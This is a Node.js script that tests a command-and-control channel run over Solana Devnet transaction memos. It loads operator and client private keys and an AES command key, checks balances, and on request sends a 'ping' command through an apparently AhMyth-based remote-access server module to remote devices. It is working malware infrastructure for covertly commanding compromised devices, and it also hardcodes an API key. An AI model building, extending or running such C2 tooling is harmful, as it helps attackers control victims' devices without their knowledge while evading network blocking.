/**
 * Test Solana Devnet blockchain C2 connectivity (PYUSD-style).
 *
 * - Loads .blockchain-keys.env / .blockchain-contract.env
 * - Checks RPC availability
 * - Verifies operator/client SOL balance
 * - Optionally sends a test "ping" command via memo (disabled by default)
 *
 * Usage:
 *   node test-blockchain-connection.js [--send-test]
 */

const fs = require('fs');
const path = require('path');
const bs58Mod = require('bs58');
const { Connection, PublicKey } = require('@solana/web3.js');
const bs58 = bs58Mod.default || bs58Mod;
const { decode: b58decode } = bs58;

const ROOT = __dirname;
const keysPath = path.join(ROOT, '.blockchain-keys.env');
const contractPath = path.join(ROOT, '.blockchain-contract.env');
const SEND_TEST = process.argv.includes('--send-test');

function loadEnvFile(p) {
  if (!fs.existsSync(p)) return {};
  return fs.readFileSync(p, 'utf8')
    .split(/\r?\n/)
    .reduce((acc, line) => {
      const m = line.trim().match(/^([^=#]+)=(.*)$/);
      if (m) acc[m[1].trim()] = m[2].trim();
      return acc;
    }, {});
}

const env = { ...loadEnvFile(keysPath), ...loadEnvFile(contractPath), ...process.env };
const ALCHEMY_KEY = env.SOLANA_ALCHEMY_KEY || env.ALCHEMY_API_KEY || env.SOLANA_ALCHEMY_API_KEY || 'iYpa8brgKRSbCQ9rb1tx8';
const RPC_CANDIDATES = [
  env.BLOCKCHAIN_RPC_URL,
  env.SOLANA_RPC_URL,
  `https://solana-devnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
  'https://api.devnet.solana.com',
  'https://rpc.ankr.com/solana_devnet'
].filter(Boolean);
const channel = env.SOLANA_CHANNEL_ADDRESS || env.BLOCKCHAIN_CONTRACT_ADDRESS;

function resolvePubkey(envKey, envAddrKey) {
  if (env[envAddrKey]) return new PublicKey(env[envAddrKey]);
  if (env[envKey]) {
    const kp = require('@solana/web3.js').Keypair.fromSecretKey(b58decode(env[envKey]));
    return kp.publicKey;
  }
  return null;
}

async function main() {
  if (!channel) throw new Error('Missing SOLANA_CHANNEL_ADDRESS/BLOCKCHAIN_CONTRACT_ADDRESS');
  let conn = null;
  let rpcUsed = null;
  let lastErr = null;

  const operatorPk = resolvePubkey('BLOCKCHAIN_PRIVATE_KEY', 'BLOCKCHAIN_WALLET_ADDRESS');
  const clientPk = resolvePubkey('BLOCKCHAIN_CLIENT_PRIVATE_KEY', 'BLOCKCHAIN_CLIENT_ADDRESS');
  if (!operatorPk || !clientPk) {
    throw new Error('Missing operator/client keys. Populate BLOCKCHAIN_WALLET_ADDRESS and BLOCKCHAIN_CLIENT_ADDRESS.');
  }

  let opBal, clientBal, channelBalance, blockhash, lastValidBlockHeight;

  for (const rpc of RPC_CANDIDATES) {
    try {
      const c = new Connection(rpc, 'confirmed');
      const blockMeta = await c.getLatestBlockhash('confirmed');
      const op = await c.getBalance(operatorPk, 'confirmed');
      const cl = await c.getBalance(clientPk, 'confirmed');
      const ch = await c.getBalance(new PublicKey(channel), 'confirmed');
      conn = c;
      rpcUsed = rpc;
      ({ blockhash, lastValidBlockHeight } = blockMeta);
      opBal = op; clientBal = cl; channelBalance = ch;
      break;
    } catch (err) {
      lastErr = err;
      continue;
    }
  }

  if (!conn) throw lastErr || new Error('No RPC available');

  console.log('RPC:', rpcUsed);
  console.log('Channel:', channel);
  console.log('Blockhash:', blockhash, `(valid until height ${lastValidBlockHeight})`);
  console.log('Operator:', operatorPk.toBase58(), '-', (opBal / 1_000_000_000).toFixed(9), 'SOL');
  console.log('Client  :', clientPk.toBase58(), '-', (clientBal / 1_000_000_000).toFixed(9), 'SOL');
  console.log('Channel :', (channelBalance / 1_000_000_000).toFixed(9), 'SOL');

  if (env.SOLANA_PYUSD_MINT && env.SOLANA_PYUSD_MINT !== 'PENDING_FUNDING') {
    console.log('PYUSD mint:', env.SOLANA_PYUSD_MINT);
  } else {
    console.log('PYUSD mint not created yet (SOLANA_PYUSD_MINT=PENDING_FUNDING).');
  }

  if (SEND_TEST) {
    console.log('\nSending test command (action=ping)...');
    // Make sure operator script sees the same env values (set before require)
    process.env.BLOCKCHAIN_RPC_URL = rpcUsed;
    process.env.SOLANA_RPC_URL = rpcUsed;
    process.env.SOLANA_CHANNEL_ADDRESS = channel;
    process.env.BLOCKCHAIN_CONTRACT_ADDRESS = channel;
    process.env.BLOCKCHAIN_PRIVATE_KEY = env.BLOCKCHAIN_PRIVATE_KEY;
    process.env.BLOCKCHAIN_C2_AES_KEY = env.BLOCKCHAIN_C2_AES_KEY;
    process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY = env.BLOCKCHAIN_CLIENT_PRIVATE_KEY;
    const { sendCommand } = require('./AhMyth-Server/app/blockchain-operator');
    await sendCommand('ping', { hello: 'solana-devnet' });
    console.log('Sent. Check device logs for memo consumption.');
  } else {
    console.log('\n--send-test not passed; skipping memo send.');
  }
}

main().catch((err) => {
  console.error('test-blockchain-connection failed:', err.message || err);
  process.exit(1);
});
